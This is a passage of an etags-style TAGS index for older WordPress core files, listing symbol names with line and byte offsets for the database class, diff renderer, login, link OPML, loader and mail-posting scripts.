		$number = preg_replace('/.+?-([0-9]+)$/', '$1', $key);number1247,38527

wordpress/wp-includes/wp-db.php,17014
define( 'EZSQL_VERSION', 'WP1.25' );EZSQL_VERSION15,221
define( 'OBJECT', 'OBJECT', true );OBJECT20,282
define( 'OBJECT_K', 'OBJECT_K' );OBJECT_K25,343
define( 'ARRAY_A', 'ARRAY_A' );ARRAY_A30,401
define( 'ARRAY_N', 'ARRAY_N' );ARRAY_N35,457
 * It is possible to replace this class with your ownwith40,545
 * file to your class. The wpdb class will still be included,will42,660
class wpdb {wpdb51,907
	var $show_errors = false;show_errors60,1019
	var $show_errors = false;show_errors60,1019
	var $suppress_errors = false;suppress_errors69,1172
	var $suppress_errors = false;suppress_errors69,1172
	var $last_error = '';last_error77,1284
	var $last_error = '';last_error77,1284
	var $num_queries = 0;num_queries86,1399
	var $num_queries = 0;num_queries86,1399
	var $num_rows = 0;num_rows95,1532
	var $num_rows = 0;num_rows95,1532
	var $rows_affected = 0;rows_affected104,1661
	var $rows_affected = 0;rows_affected104,1661
	var $insert_id = 0;insert_id113,1839
	var $insert_id = 0;insert_id113,1839
	var $last_query;last_query122,1967
	var $last_result;last_result131,2092
	var $col_info;col_info140,2213
	var $queries;queries149,2333
	var $prefix = '';prefix162,2594
	var $prefix = '';prefix162,2594
	var $ready = false;ready171,2742
	var $ready = false;ready171,2742
	var $blogid = 0;blogid180,2864
	var $blogid = 0;blogid180,2864
	var $siteid = 0;siteid189,2983
	var $siteid = 0;siteid189,2983
	var $tables = array( 'posts', 'comments', 'links', 'options', 'postmeta',tables199,3130
	var $tables = array( 'posts', 'comments', 'links', 'options', 'postmeta',tables199,3130
	var $old_tables = array( 'categories', 'post2cat', 'link2cat' );old_tables212,3488
	var $old_tables = array( 'categories', 'post2cat', 'link2cat' );old_tables212,3488
	var $global_tables = array( 'users', 'usermeta' );global_tables222,3681
	var $global_tables = array( 'users', 'usermeta' );global_tables222,3681
	var $ms_global_tables = array( 'blogs', 'signups', 'site', 'sitemeta',ms_global_tables232,3860
	var $ms_global_tables = array( 'blogs', 'signups', 'site', 'sitemeta',ms_global_tables232,3860
	var $comments;comments242,4087
	var $commentmeta;commentmeta251,4207
	var $links;links260,4319
	var $options;options269,4427
	var $postmeta;postmeta278,4543
	var $posts;posts287,4652
	var $terms;terms296,4758
	var $term_relationships;term_relationships305,4877
	var $term_taxonomy;term_taxonomy314,5004
	var $usermeta;usermeta327,5168
	var $users;users336,5277
	var $blogs;blogs345,5383
	var $blog_versions;blog_versions354,5497
	var $registration_log;registration_log363,5622
	var $signups;signups372,5741
	var $site;site381,5849
	var $sitecategories;sitecategories390,5963
	var $sitemeta;sitemeta399,6086
	var $field_types = array();field_types415,6467
	var $field_types = array();field_types415,6467
	var $charset;charset424,6598
	var $collate;collate433,6715
	var $real_escape = false;real_escape442,6839
	var $real_escape = false;real_escape442,6839
	var $dbuser;dbuser451,6956
	var $func_call;func_call460,7102
	public $is_mysql = null;is_mysql474,7509
	public $is_mysql = null;is_mysql474,7509
	 * the actual setting up of the class properties and connectionproperties480,7665
	function __construct( $dbuser, $dbpassword, $dbname, $dbhost ) {__construct491,8026
		$this->dbuser = $dbuser;dbuser499,8226
		$this->dbpassword = $dbpassword;dbpassword500,8253
		$this->dbname = $dbname;dbname501,8288
		$this->dbhost = $dbhost;dbhost502,8315
	function __destruct() {__destruct514,8526
	function init_charset() {init_charset523,8643
			$this->charset = 'utf8';charset525,8731
				$this->collate = DB_COLLATE;collate527,8807
				$this->collate = 'utf8_general_ci';collate529,8848
			$this->collate = DB_COLLATE;collate531,8929
			$this->charset = DB_CHARSET;charset535,8999
	function set_charset($dbh, $charset = null, $collate = null) {set_charset547,9288
	function set_charset($dbh, $charset = null, $collate = null) {charset547,9288
			$charset = $this->charset;charset549,9378
			$collate = $this->collate;collate551,9434
				$this->real_escape = true;real_escape555,9666
				$query = $this->prepare( 'SET NAMES %s', $charset );query557,9709
	function set_prefix( $prefix, $set_table_names = true ) {set_prefix574,10225
	function set_prefix( $prefix, $set_table_names = true ) {set_table_names574,10225
		$old_prefix = is_multisite() ? '' : $prefix;old_prefix579,10407
			$old_prefix = $this->base_prefix;old_prefix582,10492
		$this->base_prefix = $prefix;base_prefix584,10530
			foreach ( $this->tables( 'global' ) as $table => $prefixed_table )table587,10591
			$this->prefix = $this->get_blog_prefix();prefix593,10775
			foreach ( $this->tables( 'blog' ) as $table => $prefixed_table )table595,10821
			foreach ( $this->tables( 'old' ) as $table => $prefixed_table )table598,10927
	function set_blog_id( $blog_id, $site_id = 0 ) {set_blog_id613,11223
	function set_blog_id( $blog_id, $site_id = 0 ) {site_id613,11223
			$this->siteid = $site_id;siteid615,11302
		$old_blog_id  = $this->blogid;old_blog_id617,11332
		$this->blogid = $blog_id;blogid618,11365
		$this->prefix = $this->get_blog_prefix();prefix620,11394
		foreach ( $this->tables( 'blog' ) as $table => $prefixed_table )table622,11439
		foreach ( $this->tables( 'old' ) as $table => $prefixed_table )table625,11543
	function get_blog_prefix( $blog_id = null ) {get_blog_prefix639,11817
	function get_blog_prefix( $blog_id = null ) {blog_id639,11817
				$blog_id = $this->blogid;blog_id642,11918
			$blog_id = (int) $blog_id;blog_id643,11948
	function tables( $scope = 'all', $prefix = true, $blog_id = 0 ) {tables681,13555
	function tables( $scope = 'all', $prefix = true, $blog_id = 0 ) {scope681,13555
				$tables = array_merge( $this->global_tables, $this->tables );tables684,13660
					$tables = array_merge( $tables, $this->ms_global_tables );tables686,13752
				$tables = $this->tables;tables689,13844
				$tables = $this->global_tables;tables692,13903
					$tables = array_merge( $tables, $this->ms_global_tables );tables694,13965
				$tables = $this->ms_global_tables;tables697,14062
				$tables = $this->old_tables;tables700,14128
				$blog_id = $this->blogid;blog_id709,14261
			$blog_prefix = $this->get_blog_prefix( $blog_id );blog_prefix710,14291
			$base_prefix = $this->base_prefix;base_prefix711,14345
			$global_tables = array_merge( $this->global_tables, $this->ms_global_tables );global_tables712,14383
			foreach ( $tables as $k => $table ) {k713,14465
	function select( $db, $dbh = null ) {select743,15327
	function select( $db, $dbh = null ) {dbh743,15327
			$dbh = $this->dbh;dbh745,15389
			$this->ready = false;ready748,15454
	function _weak_escape( $string ) {_weak_escape772,16533
	function _real_escape( $string ) {_real_escape787,16848
	function _escape( $data ) {_escape805,17240
			foreach ( (array) $data as $k => $v ) {k807,17298
			$data = $this->_real_escape( $data );data814,17473
	function escape( $data ) {escape829,17774
			foreach ( (array) $data as $k => $v ) {k831,17831
			$data = $this->_weak_escape( $data );data838,18007
	function escape_by_ref( &$string ) {escape_by_ref852,18267
		$string = $this->_real_escape( $string );string853,18305
	 * This function only supports a small subset of the sprintf syntax; it only supports %d (integer), %f (float), and %s (string).only868,18806
	function prepare( $query = null ) { // ( $query, *$args )prepare893,20248
	function prepare( $query = null ) { // ( $query, *$args )query893,20248
		$args = func_get_args();args897,20346
			$args = $args[0];args901,20514
		$query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted itquery902,20535
		$query = str_replace( '"%s"', '%s', $query ); // doublequote unquotingquery903,20637
		$query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%squery904,20710
	function print_error( $str = '' ) {print_error918,21166
	function print_error( $str = '' ) {str918,21166
			$str = mysql_error( $this->dbh );str922,21242
		if ( $caller = $this->get_caller() )caller930,21442
			$error_str = sprintf( __( 'WordPress database error %1$s for query %2$s made by %3$s' ), $str, $this->last_query, $caller );error_str931,21481
			$error_str = sprintf( __( 'WordPress database error %1$s for query %2$s' ), $str, $this->last_query );error_str933,21616
			&& ( $log_file = @ini_get( 'error_log' ) )log_file936,21761
			$msg = "WordPress database error: [$str]\n{$this->last_query}\n";msg947,22052
			$str   = htmlspecialchars( $str, ENT_QUOTES );str953,22264
			$query = htmlspecialchars( $this->last_query, ENT_QUOTES );query954,22314
	 * This function should be used only to enable showing of errors.should966,22581
	 * this function can be used to enable and disable showing of databasecan968,22726
	function show_errors( $show = true ) {show_errors977,22968
	function show_errors( $show = true ) {show977,22968
		$errors = $this->show_errors;errors978,23008
		$this->show_errors = $show;show_errors979,23040
	function hide_errors() {hide_errors993,23300
		$show = $this->show_errors;show994,23326
		$this->show_errors = false;show_errors995,23356
	 * call to this function they can be enabled.they1003,23517
	function suppress_errors( $suppress = true ) {suppress_errors1010,23711
	function suppress_errors( $suppress = true ) {suppress1010,23711
		$errors = $this->suppress_errors;errors1011,23759
		$this->suppress_errors = (bool) $suppress;suppress_errors1012,23795
	function flush() {flush1022,23940
		$this->last_result = array();last_result1023,23960
		$this->col_info    = null;col_info1024,23992
		$this->last_query  = null;last_query1025,24021
	function db_connect() {db_connect1033,24120
		$this->is_mysql = true;is_mysql1035,24146
			$this->dbh = mysql_connect( $this->dbhost, $this->dbuser, $this->dbpassword, true );dbh1038,24193
			$this->dbh = @mysql_connect( $this->dbhost, $this->dbuser, $this->dbpassword, true );dbh1040,24292
		$this->ready = true;ready1061,25292
	function query( $query ) {query1076,25641
		$query = apply_filters( 'query', $query );query1081,25820
		$return_val = 0;return_val1083,25866
		// Log how the function was calledwas1086,25904
		$this->func_call = "\$db->query(\"$query\")";func_call1087,25941
		$this->last_query = $query;last_query1090,26036
		$this->result = @mysql_query( $query, $this->dbh );result1095,26142
		if ( $this->last_error = mysql_error( $this->dbh ) ) {last_error1102,26401
			$return_val = $this->result;return_val1108,26577
			$this->rows_affected = mysql_affected_rows( $this->dbh );rows_affected1110,26689
				$this->insert_id = mysql_insert_id($this->dbh);insert_id1113,26844
			$return_val = $this->rows_affected;return_val1116,26938
			$i = 0;i1118,26988
			$num_rows = 0;num_rows1123,27132
			while ( $row = @mysql_fetch_object( $this->result ) ) {row1124,27150
			$this->num_rows = $num_rows;num_rows1133,27400
			$return_val     = $num_rows;return_val1134,27432
	function insert( $table, $data, $format = null ) {insert1159,28444
	function insert( $table, $data, $format = null ) {format1159,28444
	function replace( $table, $data, $format = null ) {replace1182,29528
	function replace( $table, $data, $format = null ) {format1182,29528
	 * Helper function for insert and replace.for1187,29667
	function _insert_replace_helper( $table, $data, $format = null, $type = 'INSERT' ) {_insert_replace_helper1204,30619
	function _insert_replace_helper( $table, $data, $format = null, $type = 'INSERT' ) {format1204,30619
		$formats = $format = (array) $format;formats1207,30795
		$fields = array_keys( $data );fields1208,30835
		$formatted_fields = array();formatted_fields1209,30868
				$form = ( $form = array_shift( $formats ) ) ? $form : $format[0];form1212,30961
				$form = $this->field_types[$field];form1214,31081
				$form = '%s';form1216,31129
		$sql = "{$type} INTO `$table` (`" . implode( '`,`', $fields ) . "`) VALUES (" . implode( ",", $formatted_fields ) . ")";sql1219,31183
	function update( $table, $data, $where, $format = null, $where_format = null ) {update1244,32855
	function update( $table, $data, $where, $format = null, $where_format = null ) {format1244,32855
		$formats = $format = (array) $format;formats1248,33008
		$bits = $wheres = array();bits1249,33048
				$form = ( $form = array_shift( $formats ) ) ? $form : $format[0];form1252,33159
				$form = $this->field_types[$field];form1254,33277
				$form = '%s';form1256,33325
		$where_formats = $where_format = (array) $where_format;where_formats1260,33383
				$form = ( $form = array_shift( $where_formats ) ) ? $form : $where_format[0];form1263,33530
				$form = $this->field_types[$field];form1265,33662
				$form = '%s';form1267,33710
		$sql = "UPDATE `$table` SET " . implode( ', ', $bits ) . ' WHERE ' . implode( ' AND ', $wheres );sql1271,33770
	function delete( $table, $where, $where_format = null ) {delete1293,34909
	function delete( $table, $where, $where_format = null ) {where_format1293,34909
		$bits = $wheres = array();bits1297,35016
		$where_formats = $where_format = (array) $where_format;where_formats1299,35046
				$form = ( $form = array_shift( $where_formats ) ) ? $form : $where_format[0];form1303,35188
				$form = $this->field_types[ $field ];form1305,35326
				$form = '%s';form1307,35380
		$sql = "DELETE FROM $table WHERE " . implode( ' AND ', $wheres );sql1313,35442
	 * If the SQL result contains more than one column and/or more than one row, this function returns the value in the column and row specified.returns1322,35694
	 * If $query is null, this function returns the value in the specified column and row from the previous SQL result.returns1323,35837
	function get_var( $query = null, $x = 0, $y = 0 ) {get_var1332,36309
	function get_var( $query = null, $x = 0, $y = 0 ) {query1332,36309
		$this->func_call = "\$db->get_var(\"$query\", $x, $y)";func_call1333,36362
			$values = array_values( get_object_vars( $this->last_result[$y] ) );values1339,36562
	function get_row( $query = null, $output = OBJECT, $y = 0 ) {get_row1359,37340
	function get_row( $query = null, $output = OBJECT, $y = 0 ) {query1359,37340
		$this->func_call = "\$db->get_row(\"$query\",$output,$y)";func_call1360,37403
		if ( $output == OBJECT ) {output1369,37590
		} elseif ( $output == ARRAY_A ) {output1371,37685
		} elseif ( $output == ARRAY_N ) {output1373,37806
	 * If the SQL result contains more than one column, this function returns the column specified.returns1384,38221
	 * If $query is null, this function returns the specified column from the previous SQL result.returns1385,38318
	function get_col( $query = null , $x = 0 ) {get_col1393,38672
	function get_col( $query = null , $x = 0 ) {query1393,38672
		$new_array = array();new_array1397,38762
		for ( $i = 0, $j = count( $this->last_result ); $i < $j; $i++ ) {i1399,38817
	function get_results( $query = null, $output = OBJECT ) {get_results1418,39708
	function get_results( $query = null, $output = OBJECT ) {query1418,39708
		$this->func_call = "\$db->get_results(\"$query\", $output)";func_call1419,39767
		$new_array = array();new_array1426,39898
		if ( $output == OBJECT ) {output1427,39922
		} elseif ( $output == OBJECT_K ) {output1430,40032
				$var_by_ref = get_object_vars( $row );var_by_ref1434,40207
				$key = array_shift( $var_by_ref );key1435,40250
		} elseif ( $output == ARRAY_A || $output == ARRAY_N ) {output1440,40389
					if ( $output == ARRAY_N ) {output1444,40572
	function get_col_info( $info_type = 'name', $col_offset = -1 ) {get_col_info1467,41295
	function get_col_info( $info_type = 'name', $col_offset = -1 ) {info_type1467,41295
			if ( $col_offset == -1 ) {col_offset1469,41388
				$i = 0;i1470,41418
				$new_array = array();new_array1471,41430
	function timer_start() {timer_start1490,41765
		$this->time_start = microtime( true );time_start1491,41791
	function timer_stop() {timer_stop1502,41977
	function bail( $message, $error_code = '500' ) {bail1517,42357
	function bail( $message, $error_code = '500' ) {error_code1517,42357
				$this->error = new WP_Error($error_code, $message);error1520,42475
				$this->error = $message;error1522,42539
	function check_database_version() {check_database_version1537,42794
	function supports_collation() {supports_collation1553,43403
	function has_cap( $db_cap ) {has_cap1566,43658
		$version = $this->db_version();version1567,43689
	 * Retrieve the name of the function that called wpdb.that1582,44041
	function get_caller() {get_caller1591,44300
	function db_version() {db_version1602,44516

wordpress/wp-includes/wp-diff.php,5128
class WP_Text_Diff_Renderer_Table extends Text_Diff_Renderer {WP_Text_Diff_Renderer_Table26,619
	var $_leading_context_lines  = 10000;_leading_context_lines34,797
	var $_leading_context_lines  = 10000;_leading_context_lines34,797
	var $_trailing_context_lines = 10000;_trailing_context_lines42,952
	var $_trailing_context_lines = 10000;_trailing_context_lines42,952
	var $_diff_threshold = 0.6;_diff_threshold51,1097
	var $_diff_threshold = 0.6;_diff_threshold51,1097
	var $inline_diff_renderer = 'WP_Text_Diff_Renderer_inline';inline_diff_renderer60,1235
	var $inline_diff_renderer = 'WP_Text_Diff_Renderer_inline';inline_diff_renderer60,1235
	 * This will set class properties based on the key value pairs in the array.properties65,1367
	function __construct( $params = array() ) {__construct71,1500
	function __construct( $params = array() ) {params71,1500
	function _startBlock( $header ) {_startBlock81,1654
	function _lines( $lines, $prefix=' ' ) {_lines91,1782
	function _lines( $lines, $prefix=' ' ) {prefix91,1782
	function addedLine( $line ) {addedLine100,1920
	function deletedLine( $line ) {deletedLine110,2109
	function contextLine( $line ) {contextLine120,2302
	function emptyLine() {emptyLine129,2444
	function _added( $lines, $encode = true ) {_added141,2625
	function _added( $lines, $encode = true ) {encode141,2625
		$r = '';r142,2670
				$line = htmlspecialchars( $line );line145,2729
	function _deleted( $lines, $encode = true ) {_deleted159,2980
	function _deleted( $lines, $encode = true ) {encode159,2980
		$r = '';r160,3027
				$line = htmlspecialchars( $line );line163,3086
	function _context( $lines, $encode = true ) {_context177,3339
	function _context( $lines, $encode = true ) {encode177,3339
		$r = '';r178,3386
				$line = htmlspecialchars( $line );line181,3445
	function _changed( $orig, $final ) {_changed201,3927
		$r = '';r202,3965
		$orig_diffs  = array();orig_diffs214,4587
		$final_diffs = array();final_diffs215,4613
		foreach ( $orig_matches as $o => $f ) {o218,4708
				$text_diff = new Text_Diff( 'auto', array( array($orig[$o]), array($final[$f]) ) );text_diff220,4795
				$renderer = new $this->inline_diff_renderer;renderer221,4883
				$diff = $renderer->render( $text_diff );diff222,4932
				if ( $diff_count = preg_match_all( '!(<ins>.*?</ins>|<del>.*?</del>)!', $diff, $diff_matches ) ) {diff_count225,5045
					$stripped_matches = strlen(strip_tags( join(' ', $diff_matches[0]) ));stripped_matches227,5198
					$stripped_diff = strlen(strip_tags( $diff )) * 2 - $stripped_matches;stripped_diff230,5424
					$diff_ratio = $stripped_matches / $stripped_diff;diff_ratio231,5499
				$orig_line = $orig_diffs[$orig_rows[$row]];orig_line249,6150
				$orig_line = htmlspecialchars($orig[$orig_rows[$row]]);orig_line251,6245
				$orig_line = '';orig_line253,6313
				$final_line = $final_diffs[$final_rows[$row]];final_line256,6386
				$final_line = htmlspecialchars($final[$final_rows[$row]]);final_line258,6486
				$final_line = '';final_line260,6557
	function interleave_changed_lines( $orig, $final ) {interleave_changed_lines288,7376
		$matches = array();matches291,7540
		$orig_matches  = array();orig_matches299,7783
		$final_matches = array();final_matches300,7811
		foreach ( $matches as $keys => $difference ) {keys302,7840
			$o = (int) $o;o304,7928
			$f = (int) $f;f305,7946
		$orig_rows = $orig_rows_copy = array_keys($orig_matches);orig_rows332,8734
		$final_rows = array_keys($final_matches);final_rows333,8794
			$final_pos = array_search($orig_matches[$orig_row], $final_rows, true);final_pos338,9029
			$orig_pos = (int) array_search($orig_row, $orig_rows, true);orig_pos339,9104
				$diff_pos = $final_pos - $orig_pos;diff_pos344,9399
				$diff_pos = $orig_pos - $final_pos;diff_pos348,9632
		$diff_count = count($orig_rows) - count($final_rows);diff_count355,9842
			$diff_count = -1 * $diff_count;diff_count360,10030
		foreach ( $orig_matches as $o => $f ) {o373,10298
		foreach ( $final_matches as $f => $o ) {f382,10502
		foreach ( $orig_rows as $row => $o ) {row392,10725
				$o = 'X';o394,10783
			$f = $final_rows[$row];f395,10797
				$f = 'X';f397,10841
	function compute_string_distance( $string1, $string2 ) {compute_string_distance419,11222
		$chars1 = count_chars($string1);chars1421,11353
		$chars2 = count_chars($string2);chars2422,11388
		$difference = array_sum( array_map( array(&$this, 'difference'), $chars1, $chars2 ) );difference425,11459
	function difference( $a, $b ) {difference443,11850
class WP_Text_Diff_Renderer_inline extends Text_Diff_Renderer_inline {WP_Text_Diff_Renderer_inline455,12042
	function _splitOnWords($string, $newlineEscape = "\n") {_splitOnWords465,12235
	function _splitOnWords($string, $newlineEscape = "\n") {newlineEscape465,12235
		$string = str_replace("\0", '', $string);string466,12293
		$words  = preg_split( '/([^\w])/u', $string, -1, PREG_SPLIT_DELIM_CAPTURE );words467,12337
		$words  = str_replace( "\n", $newlineEscape, $words );words468,12416

wordpress/wp-links-opml.php,599
$link_cat = '';link_cat18,577
	$link_cat = $_GET['link_cat'];link_cat20,628
		$link_cat = absint( (string)urldecode($link_cat) );link_cat22,708
	$cats = get_categories(array('taxonomy' => 'link_category', 'hierarchical' => 0));cats36,1086
	$cats = get_categories(array('taxonomy' => 'link_category', 'hierarchical' => 0, 'include' => $link_cat));cats38,1175
	$catname = apply_filters('link_category', $cat->name);catname41,1319
	$bookmarks = get_bookmarks(array("category" => $cat->term_id));bookmarks46,1453
		$title = apply_filters('link_title', $bookmark->link_name);title48,1564

wordpress/wp-load.php,419
define( 'ABSPATH', dirname(__FILE__) . '/' );ABSPATH22,617
		$path = 'setup-config.php';path42,1375
		$path = 'wp-admin/setup-config.php';path44,1411
	define( 'WPINC', 'wp-includes' );WPINC46,1451
	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );WP_CONTENT_DIR47,1486
	$die  = __( "There doesn't seem to be a <code>wp-config.php</code> file. I need this before we can get started." ) . '</p>';die57,1787

wordpress/wp-login.php,7846
function login_header($title = 'Log In', $message = '', $wp_error = '') {login_header41,1317
function login_header($title = 'Log In', $message = '', $wp_error = '') {message41,1317
		$wp_error = new WP_Error();wp_error48,1545
	$shake_error_codes = array( 'empty_password', 'empty_email', 'invalid_email', 'invalidcombo', 'empty_username', 'invalid_username', 'incorrect_password' );shake_error_codes51,1590
	$shake_error_codes = apply_filters( 'shake_error_codes', $shake_error_codes );shake_error_codes52,1747
		$login_header_url   = network_home_url();login_header_url75,2610
		$login_header_title = $current_site->site_name;login_header_title76,2654
		$login_header_url   = __( 'http://wordpress.org/' );login_header_url78,2714
		$login_header_title = __( 'Powered by WordPress' );login_header_title79,2769
	$login_header_url   = apply_filters( 'login_headerurl',   $login_header_url   );login_header_url82,2827
	$login_header_title = apply_filters( 'login_headertitle', $login_header_title );login_header_title83,2909
		$login_header_url = '#';login_header_url87,3078
	$message = apply_filters('login_message', $message);message98,3417
		$errors = '';errors109,3711
		$messages = '';messages110,3727
			$severity = $wp_error->get_error_data($code);severity112,3799
function login_footer($input_id = '') {login_footer132,4416
function wp_shake_js() {wp_shake_js156,5122
addLoadEvent = function(func){if(typeof jQuery!="undefined")jQuery(document).ready(func);else if(typeof wpOnload!='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};addLoadEvent161,5215
function s(id,pos){g(id).left=pos+'px';}s162,5428
function g(id){return document.getElementById(id).style;}g163,5469
function shake(id,a,d){c=a.shift();s(id,c);if(a.length>0){setTimeout(function(){shake(id,a,d);},d);}else{try{g(id).position='static';wp_attempt_focus();}catch(e){}}}shake164,5527
function retrieve_password() {retrieve_password177,6043
	$errors = new WP_Error();errors180,6105
		$user_data = get_user_by( 'email', trim( $_POST['user_login'] ) );user_data185,6327
		$login = trim($_POST['user_login']);login189,6553
		$user_data = get_user_by('login', $login);user_data190,6592
	$user_login = $user_data->user_login;user_login204,6935
	$user_email = $user_data->user_email;user_email205,6974
	$allow = apply_filters('allow_password_reset', true, $user_data->ID);allow210,7137
	$key = $wpdb->get_var($wpdb->prepare("SELECT user_activation_key FROM $wpdb->users WHERE user_login = %s", $user_login));key217,7372
		$key = wp_generate_password(20, false);key220,7561
	$message = __('Someone requested that the password be reset for the following account:') . "\r\n\r\n";message225,7812
		$blogname = $GLOBALS['current_site']->site_name;blogname233,8375
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);blogname237,8595
	$title = sprintf( __('[%s] Password Reset'), $blogname );title239,8670
	$title = apply_filters('retrieve_password_title', $title);title241,8730
	$message = apply_filters('retrieve_password_message', $message, $key);message242,8790
function check_password_reset_key($key, $login) {check_password_reset_key259,9387
	$key = preg_replace('/[^a-z0-9]/i', '', $key);key262,9453
	$user = $wpdb->get_row($wpdb->prepare("SELECT * FROM $wpdb->users WHERE user_activation_key = %s AND user_login = %s", $key, $login));user270,9706
function reset_password($user, $new_pass) {reset_password284,10093
function register_new_user( $user_login, $user_email ) {register_new_user299,10514
	$errors = new WP_Error();errors300,10571
	$sanitized_user_login = sanitize_user( $user_login );sanitized_user_login302,10599
	$user_email = apply_filters( 'user_registration_email', $user_email );user_email303,10654
	if ( $sanitized_user_login == '' ) {sanitized_user_login306,10750
		$sanitized_user_login = '';sanitized_user_login310,11096
	if ( $user_email == '' ) {user_email316,11350
		$user_email = '';user_email320,11626
	$errors = apply_filters( 'registration_errors', $errors, $sanitized_user_login, $user_email );errors327,11899
	$user_pass = wp_generate_password( 12, false);user_pass332,12049
	$user_id = wp_create_user( $sanitized_user_login, $user_pass, $user_email );user_id333,12097
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';action350,12603
$errors = new WP_Error();errors351,12673
	$action = 'resetpass';action354,12727
	$action = 'login';action358,13000
	$schema = is_ssl() ? 'https://' : 'http://';schema368,13360
$http_post = ('POST' == $_SERVER['REQUEST_METHOD']);http_post382,14006
		$wp_hasher = new PasswordHash(8, true);wp_hasher389,14238
	$redirect_to = !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : 'wp-login.php?loggedout=true';redirect_to404,14559
		$errors = retrieve_password();errors414,14793
			$redirect_to = !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : 'wp-login.php?checkemail=confirm';redirect_to416,14859
	$redirect_to = apply_filters( 'lostpassword_redirect', !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '' );redirect_to423,15176
	$user_login = isset($_POST['user_login']) ? stripslashes($_POST['user_login']) : '';user_login428,15523
	$user = check_password_reset_key($_GET['key'], $_GET['login']);user455,16673
	$errors = '';errors462,16860
		$errors = new WP_Error('password_reset_mismatch', __('The passwords do not match.'));errors465,16947
	$user_login = '';user_login521,19411
	$user_email = '';user_email522,19430
		$user_login = $_POST['user_login'];user_login524,19470
		$user_email = $_POST['user_email'];user_email525,19508
		$errors = register_new_user($user_login, $user_email);errors526,19546
			$redirect_to = !empty( $_POST['redirect_to'] ) ? $_POST['redirect_to'] : 'wp-login.php?checkemail=registered';redirect_to528,19636
	$redirect_to = apply_filters( 'registration_redirect', !empty( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '' );redirect_to534,19806
	$secure_cookie = '';secure_cookie565,21384
	$interim_login = isset($_REQUEST['interim-login']);interim_login566,21406
	$customize_login = isset( $_REQUEST['customize-login'] );customize_login567,21459
		$user_name = sanitize_user($_POST['log']);user_name573,21716
		if ( $user = get_user_by('login', $user_name) ) {user574,21761
				$secure_cookie = true;secure_cookie576,21863
		$redirect_to = $_REQUEST['redirect_to'];redirect_to583,21974
			$redirect_to = preg_replace('|^http://|', 'https://', $redirect_to);redirect_to586,22128
		$redirect_to = admin_url();redirect_to588,22210
	$reauth = empty($_REQUEST['reauth']) ? false : true;reauth591,22244
		$secure_cookie = false;secure_cookie597,22818
	$user = wp_signon('', $secure_cookie);user599,22845
	$redirect_to = apply_filters('login_redirect', $redirect_to, isset( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '', $user);redirect_to601,22886
			$message = '<p class="message">' . __('You have logged in successfully.') . '</p>';message605,23092
		if ( ( empty( $redirect_to ) || $redirect_to == 'wp-admin/' || $redirect_to == admin_url() ) ) {redirect_to622,23836
				$redirect_to = user_admin_url();redirect_to625,24159
				$redirect_to = get_dashboard_url( $user->ID );redirect_to627,24252
				$redirect_to = admin_url('profile.php');redirect_to629,24347
	$errors = $user;errors635,24444
		$errors = new WP_Error();errors638,24546
		$user_login = ( 'incorrect_password' == $errors->get_error_code() || 'empty_password' == $errors->get_error_code() ) ? esc_attr(stripslashes($_POST['log'])) : '';user_login667,26278
	$rememberme = ! empty( $_POST['rememberme'] );rememberme668,26443
function wp_attempt_focus(){wp_attempt_focus709,28538

wordpress/wp-mail.php,5673
/** Get the POP3 class with which to access the mailbox. */with19,553
	define('WP_MAIL_INTERVAL', 300); // 5 minutesWP_MAIL_INTERVAL24,756
$last_checked = get_transient('mailserver_last_checked');last_checked26,804
$time_difference = get_option('gmt_offset') * 3600;time_difference33,1027
$phone_delim = '::';phone_delim35,1080
$pop3 = new POP3();pop337,1102
$count = $pop3->pass( get_option('mailserver_pass') );count42,1297
for ( $i = 1; $i <= $count; $i++ ) {i52,1517
	$message = $pop3->get($i);message54,1555
	$bodysignal = false;bodysignal56,1584
	$boundary = '';boundary57,1606
	$charset = '';charset58,1623
	$content = '';content59,1639
	$content_type = '';content_type60,1655
	$content_transfer_encoding = '';content_transfer_encoding61,1676
	$post_author = 1;post_author62,1710
	$author_found = false;author_found63,1729
	$dmonths = array('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec');dmonths64,1753
			$bodysignal = true;bodysignal68,1931
				$content_type = trim($line);content_type73,2061
				$content_type = substr($content_type, 14, strlen($content_type) - 14);content_type74,2094
				$content_type = explode(';', $content_type);content_type75,2169
					$charset = explode('=', $content_type[1]);charset77,2259
					$charset = ( ! empty( $charset[1] ) ) ? trim($charset[1]) : '';charset78,2307
				$content_type = $content_type[0];content_type80,2382
				$content_transfer_encoding = trim($line);content_transfer_encoding83,2489
				$content_transfer_encoding = substr($content_transfer_encoding, 27, strlen($content_transfer_encoding) - 27);content_transfer_encoding84,2535
				$content_transfer_encoding = explode(';', $content_transfer_encoding);content_transfer_encoding85,2649
				$content_transfer_encoding = $content_transfer_encoding[0];content_transfer_encoding86,2724
			if ( ( $content_type == 'multipart/alternative' ) && ( false !== strpos($line, 'boundary="') ) && ( '' == $boundary ) ) {content_type88,2793
				$boundary = trim($line);boundary89,2918
				$boundary = explode('"', $boundary);boundary90,2947
				$boundary = $boundary[1];boundary91,2988
				$subject = trim($line);subject94,3067
				$subject = substr($subject, 9, strlen($subject) - 9);subject95,3095
					$subject = iconv_mime_decode($subject, 2, get_option('blog_charset'));subject98,3278
					$subject = wp_iso_descrambler($subject);subject100,3367
				$subject = explode($phone_delim, $subject);subject102,3419
				$subject = $subject[0];subject103,3467
					$author = $matches[0];author110,3768
					$author = trim($line);author112,3805
				$author = sanitize_email($author);author113,3833
					$userdata = get_user_by('email', $author);userdata116,3968
						$post_author = $userdata->ID;post_author118,4051
						$author_found = true;author_found119,4087
				$ddate = trim($line);ddate125,4213
				$ddate = str_replace('Date: ', '', $ddate);ddate126,4239
					$ddate = trim(substr($ddate, strpos($ddate, ',') + 1, strlen($ddate)));ddate128,4318
				$date_arr = explode(' ', $ddate);date_arr130,4401
				$date_time = explode(':', $date_arr[3]);date_time131,4439
				$ddate_H = $date_time[0];ddate_H133,4485
